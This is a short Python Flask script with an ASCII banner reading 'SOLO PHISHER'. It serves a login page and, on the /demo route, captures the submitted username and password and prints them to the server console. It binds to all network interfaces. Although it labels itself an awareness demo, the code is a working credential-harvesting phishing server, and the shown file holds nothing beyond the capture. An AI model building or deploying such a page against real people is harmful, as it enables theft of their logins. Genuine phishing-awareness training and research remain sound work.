from flask import Flask, render_template, request

app = Flask(__name__)

# Banner
print(r"""

███████╗ ██████╗ ██╗      ██████╗     ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗
██╔════╝██╔═══██╗██║     ██╔═══██╗    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
███████╗██║   ██║██║     ██║   ██║    ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
╚════██║██║   ██║██║     ██║   ██║    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
███████║╚██████╔╝███████╗╚██████╔╝    ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝     ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

                                  By Neeraj
""")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/demo', methods=['POST'])
def demo():

    username = request.form.get('username')
    password = request.form.get('password')

    print("\n===== Awareness Demo =====")
    print("Demo Username:", username)
    print("Demo Password:", password)
    print("==========================\n")

    return """
    <h2>Cybersecurity Awareness Demo</h2>

    <p>This project is created for educational awareness only.</p>

    <a href="/">Back</a>
    """

if __name__ == '__main__':
    app.run(
        host='0.0.0.0',
        port=5000,
        debug=False,
        use_reloader=False
    )
